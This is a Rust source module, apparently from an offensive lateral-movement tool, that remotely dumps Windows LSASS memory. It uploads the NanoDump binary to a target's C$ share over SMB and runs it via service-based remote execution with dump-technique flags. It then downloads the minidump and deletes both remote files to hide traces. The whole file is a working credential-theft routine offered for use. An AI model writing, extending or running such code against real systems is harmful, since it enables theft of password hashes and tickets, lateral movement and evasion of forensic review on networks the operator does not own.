//! Remote LSASS minidump via NanoDump over SMB — pure Rust.
//!
//! Flow:
//! 1. Upload NanoDump to `C$\Windows\Temp\nd_<nonce>.exe` via SMB WRITE.
//! 2. Execute it via smbexec (SCM service): `nd.exe <args> --write <dmp>`.
//! 3. Download the resulting `.dmp` from `C$\Windows\Temp\nd_<nonce>.dmp`.
//! 4. Delete both remote files (best-effort cleanup, always runs).
//! 5. Return the raw minidump bytes — caller saves to disk.
//!
//! The dump technique is controlled through `extra_args`, e.g. `"--fork"`,
//! `"--dup"`, `"--snapshot"`. Pass `""` for NanoDump's default behaviour.

use std::time::{SystemTime, UNIX_EPOCH};

use super::connection::SmbCredential;
use super::exec::execute_command_live;
use super::rpc::{connect_session, host_only};

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

/// Result returned by [`remote_lsass_dump`].
pub struct LsassDumpResult {
    /// Raw bytes of the `.dmp` file downloaded from the target.
    pub dump_bytes: Vec<u8>,
    /// One-line summary for the caller's log.
    pub summary: String,
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

/// Upload NanoDump, execute it, download the minidump, clean up.
///
/// * `nanodump_bytes` — the NanoDump PE read from the local filesystem.
/// * `extra_args`     — technique flags forwarded to NanoDump, e.g. `"--fork"`.
/// * `live_log`       — receives progress lines as they happen (UI streaming).
pub async fn remote_lsass_dump(
    target: &str,
    cred: &SmbCredential,
    nanodump_bytes: &[u8],
    extra_args: &str,
    live_log: &(dyn Fn(&str) + Send + Sync),
) -> Result<LsassDumpResult, String> {
    let nonce = gen_nonce();
    let host = host_only(target);

    // Relative paths on the C$ share (no drive letter, backslash-relative).
    let exe_rel = format!("Windows\\Temp\\nd_{nonce}.exe");
    let dmp_rel = format!("Windows\\Temp\\nd_{nonce}.dmp");

    // Absolute Windows paths used in the command line executed on the target.
    let exe_win = format!("C:\\Windows\\Temp\\nd_{nonce}.exe");
    let dmp_win = format!("C:\\Windows\\Temp\\nd_{nonce}.dmp");

    macro_rules! log {
        ($($arg:tt)*) => {{
            let msg = format!($($arg)*);
            live_log(&msg);
            eprintln!("[nanodump] {msg}");
        }};
    }

    // ── 1. Upload NanoDump binary ─────────────────────────────────────────
    log!("uploading NanoDump ({} bytes) → {exe_win}", nanodump_bytes.len());
    {
        let cred2 = cred.clone();
        let target2 = target.to_owned();
        let host2 = host.clone();
        let rel2 = exe_rel.clone();
        let bytes2 = nanodump_bytes.to_vec();
        tokio::task::spawn_blocking(move || {
            let mut session = connect_session(&target2, &cred2)?;
            session.write_full_file(&host2, "C$", &rel2, &bytes2)
        })
        .await
        .map_err(|e| format!("upload task join: {e}"))??;
    }
    log!("upload OK");

    // ── 2. Execute NanoDump ───────────────────────────────────────────────
    let args = if extra_args.is_empty() {
        format!("--write {dmp_win}")
    } else {
        format!("{extra_args} --write {dmp_win}")
    };
    let cmd = format!("{exe_win} {args}");
    log!("running: {cmd}");

    let exec_result = execute_command_live(target, Some(cred), &cmd, live_log)
        .await
        .0;

    // Clean up the exe regardless of exec outcome.
    cleanup_file(target, cred, &host, &exe_rel).await;

    let nd_out = exec_result.map_err(|e| format!("NanoDump exec: {e}"))?;
    log!("NanoDump stdout: {nd_out}");

    // Surface explicit failure keywords from NanoDump's own output.
    let out_lc = nd_out.to_lowercase();
    if out_lc.contains("error") || out_lc.contains("failed") || out_lc.contains("cannot") {
        cleanup_file(target, cred, &host, &dmp_rel).await;
        return Err(format!("NanoDump reported failure: {nd_out}"));
    }

    // ── 3. Download the minidump ──────────────────────────────────────────
    log!("downloading dump from C$\\{dmp_rel}");
    let download_result = {
        let cred2 = cred.clone();
        let target2 = target.to_owned();
        let host2 = host.clone();
        let rel2 = dmp_rel.clone();
        tokio::task::spawn_blocking(move || {
            let mut session = connect_session(&target2, &cred2)?;
            session
                .read_full_file(&host2, "C$", &rel2)
                .map_err(|e| e.as_str())
        })
        .await
        .map_err(|e| format!("download task join: {e}"))
        .and_then(|r| r)
    };

    // Always clean up the dmp file (whether download succeeded or failed).
    cleanup_file(target, cred, &host, &dmp_rel).await;

    let dump_bytes = download_result?;
    let dump_len = dump_bytes.len();
    log!("dump downloaded: {dump_len} bytes");

    // Sanity-check the MDMP magic.
    if dump_bytes.len() < 4 || &dump_bytes[..4] != b"MDMP" {
        return Err(format!(
            "downloaded file is not a valid minidump (first 4 bytes: {:02x?})",
            &dump_bytes[..dump_bytes.len().min(4)]
        ));
    }

    Ok(LsassDumpResult {
        summary: format!("LSASS minidump: {dump_len} bytes"),
        dump_bytes,
    })
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn gen_nonce() -> String {
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{ts:x}")
}

/// Delete a remote file (best-effort — errors are logged, never propagated).
async fn cleanup_file(target: &str, cred: &SmbCredential, host: &str, rel: &str) {
    let cred2 = cred.clone();
    let target2 = target.to_owned();
    let host2 = host.to_owned();
    let rel2 = rel.to_owned();
    let outcome = tokio::task::spawn_blocking(move || {
        let mut session = connect_session(&target2, &cred2).ok()?;
        session.delete_on_close(&host2, "C$", &rel2).ok()
    })
    .await;
    if let Ok(None) | Err(_) = outcome {
        eprintln!("[nanodump] warning: cleanup of C$\\{rel} may have failed");
    }
}
